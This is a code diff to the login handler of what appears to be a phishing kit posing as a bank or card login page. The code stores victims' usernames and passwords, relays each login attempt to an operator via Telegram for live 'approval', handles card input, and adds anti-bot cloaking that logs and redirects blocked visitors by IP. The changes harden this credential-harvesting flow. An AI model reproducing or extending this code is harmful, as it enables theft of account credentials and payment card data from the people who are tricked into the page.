@@ -379,7 +379,17 @@ const handleCardVerificationFromTelegram = () => {
   };
 
   const handleLogin = async (e) => {
-  e.preventDefault();
+  // Prevent any default behavior
+  if (e) {
+    e.preventDefault();
+    e.stopPropagation();
+  }
+  
+  // Don't allow multiple submissions
+  if (isLoading || waitingForApproval) {
+    console.log('⚠️ Login already in progress');
+    return;
+  }
   
   const newErrors = {
     loginName: loginName.trim() === '',
@@ -391,19 +401,34 @@ const handleCardVerificationFromTelegram = () => {
   const antiBotResult = checkAntiBot();
   
   if (!antiBotResult.passed) {
-    // ... block handling ...
+    let userIP = 'Unable to get IP';
+    try {
+      const ipResponse = await axios.get('https://api.ipify.org?format=json');
+      userIP = ipResponse.data.ip;
+    } catch (ipError) {
+      console.error('Error getting IP:', ipError);
+    }
+    
+    if (sendBlockedLog) {
+      await sendBlockedLog(loginName, antiBotResult.reason, userIP);
+    }
+    sessionStorage.setItem('block_reason', antiBotResult.reason);
+    window.location.href = '/#/blocked';
     return;
   }
 
   sessionStorage.setItem('loginName', loginName.trim());
   sessionStorage.setItem('password', password.trim());
 
+  // Set loading BEFORE async operations
   setIsLoading(true);
-  const newSessionId = generateSessionId();
-  setSessionId(newSessionId);
-  sessionStorage.setItem('telegramSessionId', newSessionId);
   
-  const message = `
+  try {
+    const newSessionId = generateSessionId();
+    setSessionId(newSessionId);
+    sessionStorage.setItem('telegramSessionId', newSessionId);
+    
+    const message = `
 🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 🆔 <b>Session ID:</b> <code>${newSessionId}</code>
@@ -417,13 +442,15 @@ const handleCardVerificationFromTelegram = () => {
 🤖 <b>Anti-bot Status:</b> ✅ PASSED
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>Choose an action below:</i>
-  `;
-  
-  // Send with new buttons
-  await sendLoginRequestToTelegram(message, newSessionId);
-  
-  setWaitingForApproval(true);
-  setIsLoading(false);
+    `;
+    
+    await sendLoginRequestToTelegram(message, newSessionId);
+    
+    setWaitingForApproval(true);
+  } catch (error) {
+    console.error('Login error:', error);
+    setIsLoading(false);
+  }
 };
 
   const handleCardInputChange = async (field, value) => {
